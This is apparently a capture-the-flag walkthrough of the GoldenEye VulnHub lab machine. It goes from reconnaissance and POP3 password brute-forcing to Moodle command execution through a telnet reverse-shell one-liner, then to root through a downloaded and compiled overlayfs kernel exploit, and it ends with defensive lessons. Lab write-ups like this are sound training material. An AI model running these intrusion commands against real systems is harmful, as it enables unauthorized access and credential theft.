# GoldenEye: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | GoldenEye: 1 |
| **Difficulty** | Intermediate |
| **Author** | Creosote |
| **Released** | 2018-05-04 |
| **VulnHub Entry** | <https://vulnhub.com/entry/goldeneye-1,240/> |
| **Download** | <https://vulnhub.com/entry/goldeneye-1,240/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Ubuntu 14.04 LTS) |

> An OSCP-style, James Bond-themed box. The whole game is **credential hunting
> through email and web applications**. There are no buffer overflows here —
> instead you chain together several small leaks until one of them hands you a
> shell, then you use a kernel bug to finish as `root`. Values such as passwords
> and banners can differ slightly between rebuilds of the OVA, so treat the
> outputs below as *representative*.

---

## 0. What you will learn

- How to discover a host on an isolated lab network (ARP scan / `netdiscover`).
- How to read an `nmap` full-port scan and spot **non-standard ports**.
- How to decode a hidden credential from **HTML entities** in a JavaScript file.
- How **SMTP user enumeration** (`VRFY` / `RCPT TO`) reveals valid usernames.
- How to brute-force a **POP3 mail server** with `hydra` when admins pick weak passwords.
- How to read email over **raw POP3** (`nc` / `telnet`) and harvest credentials from it.
- How a legacy web app (**Moodle 2.2.3**) turns into remote code execution through a
  misconfigured spell-checker path.
- How to find and run a **local kernel privilege-escalation exploit** (overlayfs, CVE-2015-1328).

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able
to import an OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# Identify your own IP + subnet first (the "eth0" adapter is the lab NIC)
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    link/ether 08:00:27:aa:bb:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
       valid_lft forever preferred_lft forever
```

> **How to read it:** Kali's lab interface usually holds a `192.168.56.x`
> (VirtualBox host-only) or `192.168.19x.x` (VMware) address. The target will
> live on the **same** subnet. Here our attacker is `192.168.56.10`.

```bash
# ARP-scan the subnet to list live hosts (fast, uses ARP not TCP)
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:aa:bb:cc, IPv4: 192.168.56.10
Starting arp-scan 1.9.7 with 256 hosts
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.100  08:00:27:1b:2c:3d       (Unknown)
192.168.56.101  08:00:27:4d:5e:6f       (Unknown)   <-- our target
```

> **Why it works:** `arp-scan` sends an ARP request ("who has this IP?") to every
> address in the subnet. Any machine that answers is alive. It is far faster than
> a TCP scan when you only need to *find* hosts.

**Target IP:** `192.168.56.101`

![arp-scan finding the target at 192.168.56.101](images/01-recon.png)

---

## 2. Enumeration

> **Goal:** fingerprint every open port and service on the target.

```bash
# Fast full-TCP port sweep, then service/version detection on open ports
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 25,80,55006,55007 -oA scans/services 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00045s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
55006/tcp open  ssl/pop3 Dovecot pop3d
55007/tcp open  pop3     Dovecot pop3d
```

> **How to read it:**
> - `-p-` scans all 65,535 TCP ports.
> - `-sV` guesses the **service and version** behind each open port.
> - `-sC` runs Nmap's default scripts (banners, safe checks).
> - Two things jump out: an **SMTP server** (port 25, great for username
>   enumeration) and a **POP3 mail server on a very high, non-standard port**
>   (55007) — a classic sign that someone changed the port to "hide" it.

![nmap showing ports 25, 80, 55006 and 55007](images/02-nmap.png)

Now look at the website on port 80.

```bash
curl -sI http://192.168.56.101/
curl -s http://192.168.56.101/ | head
```

```text
HTTP/1.1 302 Found
Location: http://severnaya-station.com/sev-home/
```

> **Why it works:** the server redirects us to the hostname
> `severnaya-station.com`. Virtual hosts on this box only respond correctly when
> the `Host:` header (or the URL) contains that name, so we add it to our hosts
> file:

```bash
echo "192.168.56.101 severnaya-station.com" | sudo tee -a /etc/hosts
```

Browsing `http://severnaya-station.com/sev-home/` pops an **HTTP Basic Auth**
login box. Before trying to log in, view the page source.

```bash
curl -s http://severnaya-station.com/sev-home/ | grep -i "terminal"
```

```text
<script src="terminal.js"></script>
```

```bash
curl -s http://severnaya-station.com/sev-home/js/terminal.js
```

```text
// Under Construction
// &amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;...
// (HTML-encoded string; the user comment above says it is the password)
```

> **Why it works:** the credentials are hidden as **HTML numeric character
> references** (`&#73;` = `I`, `&#110;` = `n`, …). Any HTML/entity decoder turns
> them back into plain text. Decoding the whole string yields:

```text
boris:InvincibleHack3r
```

Log in to `http://severnaya-station.com/sev-home/` with `boris` /
`InvincibleHack3r`. The page (and its "GNO" notices) tells you two crucial
things:

1. Users are *Boris*, *Natalya*, *Xenia*, … and they have **email accounts**.
2. The POP3 mail server runs on the **non-default** high port we found (55007).

![split screen: terminal.js decoded into boris:InvincibleHack3r](images/03-enum.png)

---

## 3. Foothold

> **Goal:** turn leaked credentials into the first shell.

### 3.1 Enumerate mail users over SMTP (port 25)

The simplest way to confirm which usernames exist is the POP3/SMTP `VRFY`
verb, or `smtp-user-enum`:

```bash
# Manual check
printf 'VRFY boris\r\nVRFY natalya\r\nVRFY xenia\r\nVRFY doak\r\nQUIT\r\n' \
  | nc 192.168.56.101 25
```

```text
250 boris
250 natalya
252
250 doak
221 Bye
```

> **Why it works:** `VRFY` asks the SMTP server "does this mailbox exist?".
> Different reply codes (`250` = yes, `252` = cannot verify) leak which
> usernames are real. That gives us a short list to brute-force.

### 3.2 Brute-force the POP3 passwords

Admins on this box reused weak, dictionary passwords. `fasttrack.txt` ships with
Kali and is small enough to finish in minutes:

```bash
cat > users.txt <<'EOF'
boris
natalya
EOF

hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt \
      -s 55007 -f 192.168.56.101 pop3
```

```text
[55007][pop3] host: 192.168.56.101   login: boris    password: secret1!
[55007][pop3] host: 192.168.56.101   login: natalya  password: bird
2 of 2 targets completed, 2 valid passwords found
```

> **Why it works:** `hydra` tries every username/password pair in the lists and
> watches for `+OK Logged in`. Because POP3 has no lockout here and the passwords
> are common words, the attack succeeds. Try a **small** wordlist first — big
> lists are noisy and slow.

### 3.3 Read the mail and harvest more credentials

```bash
nc 192.168.56.101 55007
```

```text
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS secret1!
+OK Logged in.
LIST
+OK 3 messages:
1 544
2 373
3 921
RETR 3
+OK 921 octets
From: alec@janus.boss
Subject: access codes
Boris, your cooperation with our syndicate will pay off big...
. 
```

> **Why it works:** POP3 is a plain-text protocol — you authenticate and then
> `LIST`/`RETR` messages by hand. No email client required. Reading *Natalya's*
> mailbox reveals her new student's credentials:

```text
USER natalya
PASS bird
RETR 2
...

Ok Natalyn I have a new student for you...
username: xenia
password: RCP90rulez!
```

Boris's mailbox hints at another contractor, **doak**. Confirm and crack him too:

```bash
printf 'VRFY doak\r\nQUIT\r\n' | nc 192.168.56.101 25
hydra -l doak -P /usr/share/wordlists/fasttrack.txt \
      -s 55007 -f 192.168.56.101 pop3
```

```text
[55007][pop3] host: 192.168.56.101   login: doak   password: goat
```

Reading **doak's** single email gives us the training-site login:

```text
From: doak@ubuntu
Go to our training site and login to my account...
username: dr_doak
password: 4England!
```

### 3.4 Get into the Moodle training site

The office page told us the internal app lives at
`severnaya-station.com/gnocertdir`. It is a **Moodle** (e-learning) site.

```bash
# hostname was already added in section 2
firefox http://severnaya-station.com/gnocertdir &
```

Log in as `xenia` / `RCP90rulez!`, click around, then log in as
`dr_doak` / `4England!`. While logged in as **dr_doak** you find the site
administrator's credentials (in a private Moodle message / profile — *the exact
location varies by build*):

```text
admin : xWinter1995x!
```

![Moodle admin login and the Site administration menu](images/04-foothold.png)

### 3.5 Abuse Moodle for remote code execution (www-data shell)

Moodle 2.2.3 lets an **admin** point its spell-checker at an arbitrary command.
That is command execution as the web user.

1. Set up a listener on Kali:

```bash
# GoldenEye's double-reverse payload uses telnet, so use Metasploit's handler
msfconsole -q
```

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload cmd/unix/reverse
msf6 exploit(multi/handler) > set LHOST 192.168.56.10
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

2. As Moodle admin navigate to **Site administration → Server → System paths**
   and set **Path to aspell** to a reverse-shell one-liner:

```text
sh -c '(sleep 10|telnet 192.168.56.10 4444|while : ; do sh && break; done 2>&1|telnet 192.168.56.10 4444 >/dev/null 2>&1 &)'
```

3. Go to **Site administration → Plugins → Text editors → TinyMCE HTML editor**
   and change the **spell engine** to `PSpellShell`.

4. Create/blog a page that uses the TinyMCE editor and click the
   **spell-checker** button. The handler catches a shell:

```text
[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.101:xxxxx)
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** the "Path to aspell" field is used to *build a shell
> command* when the spell-checker runs (`... $aspell_path ...`). Supplying a
> reverse-shell command instead of the real `aspell` binary means Moodle
> executes **our** command as `www-data`. TinyMCE's spell-check must be set to
> `PSpellShell` so that this code path is actually reached.

Upgrade the shell to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:  stty raw -echo; fg   ; and:  export TERM=xterm
```

> **Note:** some writeups reach the same `www-data` shell with the Metasploit
> module `exploit/multi/http/moodle_cmd_exec` using `admin` /
> `xWinter1995x!` — same bug, packaged for you.

![reverse shell as www-data](images/05-shell.png)

---

## 4. Privilege escalation

> **Goal:** go from `www-data` to `root`.

First, standard local enumeration:

```bash
id; uname -a; cat /etc/os-release
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP ... x86_64 GNU/Linux
VERSION="14.04.3 LTS, Trusty Tahr"
```

> **How to read it:** the kernel is **Ubuntu 3.13.0-32**, which is in the range
> affected by the **overlayfs** local privilege-escalation bug (**CVE-2015-1328**).
> The website's "chatter about compilers" is the author's hint that you'll need
> to compile a local exploit.

```bash
searchsploit 3.13 overlayfs
```

```text
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation | linux/local/37292.c
```

Copy the exploit to the target and compile it. **GoldenEye has no `gcc`** — it
has `cc` and `clang`, so edit the source to replace `gcc` with `cc`.

```bash
# On Kali: fix the compiler reference in the exploit
searchsploit -m linux/local/37292.c
sed -i 's/gcc/cc/g' 37292.c
ls -la 37292.c
```

```bash
# Serve it to the target, then download + compile + run from the www-data shell
# (run this on Kali)
python3 -m http.server 8000
```

```bash
# On the target (www-data shell)
cd /tmp
wget http://192.168.56.10:8000/37292.c
cc 37292.c -o ofs
./ofs
```

```text
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

> **Why it works:** overlayfs did not correctly check permissions when creating
> files in the "upper" directory of an overlay mount. The exploit mounts an
> overlay inside a user namespace and abuses this to write
> `/etc/ld.so.preload`, causing root-run programs to load an attacker-controlled
> shared library — i.e. code as `root`.

### The root flag

```bash
cat /root/.flag.txt
```

```text
Alec told me to place the codes here:
568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
```

> The path hint also works from the web root: browse to
> `http://severnaya-station.com/006-final/xvf7-flag/`. The code itself
> (`568628e0...`) is the flag — *hash values vary by build*.

![root shell and the flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Credentials hidden as HTML entities | `/sev-home/js/terminal.js` | Basic-auth password disclosure (`boris`) |
| 2 | Username disclosure via `VRFY` | SMTP port 25 | Short list of valid mail users |
| 3 | Weak POP3 passwords + no lockout | Dovecot on port 55007 | Mailbox access (`boris`, `natalya`, `doak`) |
| 4 | Credentials left in email bodies | POP3 mail stores | Pivot to `xenia`, `dr_doak`, then `admin` |
| 5 | Admin-controllable command path | Moodle 2.2.3 "Path to aspell" | Remote code execution as `www-data` |
| 6 | Unpatched kernel | Ubuntu 14.04 / kernel 3.13.0-32 | Local privilege escalation to `root` (overlayfs) |

## 6. Defensive lessons (blue team)

- **Never store credentials in client-side files.** HTML-entity encoding is not
  encryption — it is a speed bump. Remove secrets from JS/HTML entirely.
- **Disable `VRFY`/`EXPN`** and use `disable_vrfy_command = yes` in Postfix so
  attackers cannot enumerate valid mailboxes.
- **Enforce strong passwords and rate limiting/lockouts** on POP3/IMAP. The
  passwords here (`secret1!`, `bird`, `goat`) are in every wordlist. Also keep
  mail on standard, TLS-only ports (993/995) so it is easy to monitor.
- **Never email plaintext credentials.** Email is retained indefinitely and is
  readable by anyone who gets into a mailbox.
- **Harden web apps:** run them behind a WAF, keep Moodle patched, and never
  expose "path to binary" settings that get passed to a shell. Treat any
  admin-editable "command" field as remote code execution waiting to happen.
- **Patch the kernel** and monitor for `/etc/ld.so.preload` creation and for
  unusual `mount`/`unshare` activity — both are strong overlayfs-exploit signals.
- **Logging/detection:** alert on thousands of failed POP3 `PASS` attempts
  (hydra), on `VG`/`VRFY` storms, and on high, non-standard mail ports.

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/goldeneye-1,240/>
- Community writeups consulted:
  - [GoldenEye 1: CTF walkthrough, part 1 (Infosec Institute)](https://www.infosecinstitute.com/resources/capture-the-flag/goldeneye-1-ctf-walkthrough-part-1/)
  - [GoldenEye 1: CTF walkthrough, part 2 (Infosec Institute)](https://www.infosecinstitute.com/resources/capture-the-flag/golden-eye-1-ctf-walkthrough-part-2/)
  - [GoldenEye v1 writeup (NetChameleon)](https://netchameleon.com/VulnHub_Writeups/goldeneye_v1.html)
  - [Vulnhub Walkthrough – Goldeneye (n33dle-security)](https://n33dle-security.blogspot.com/2018/08/vulnhub-walkthrough-goldeneye.html)
  - [Vulnhub – GoldenEye writeup (mzfr)](https://blog.mzfr.me/vulnhub-writeups/2019-07-25-goldeneye)
- Vulnerability references:
  - [CVE-2015-1328 – overlayfs local privilege escalation](https://nvd.nist.gov/vuln/detail/CVE-2015-1328)
  - [Exploit-DB 37292.c](https://www.exploit-db.com/exploits/37292)
  - [Moodle RCE MSF module `exploit/multi/http/moodle_cmd_exec`](https://www.rapid7.com/db/modules/exploit/multi/http/moodle_cmd_exec)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (`arp-scan` / `netdiscover`)
- [ ] `images/02-nmap.png` — port/service scan (25, 80, 55006, 55007)
- [ ] `images/03-enum.png` — `terminal.js` decoded to `boris:InvincibleHack3r`
- [ ] `images/04-foothold.png` — Moodle admin login / System paths page
- [ ] `images/05-shell.png` — reverse shell as `www-data`
- [ ] `images/06-user-flag.png` — enumeration / credential harvest (user-level access)
- [ ] `images/07-privesc.png` — compiling and running the overlayfs exploit
- [ ] `images/08-root-flag.png` — `root` shell and `/root/.flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
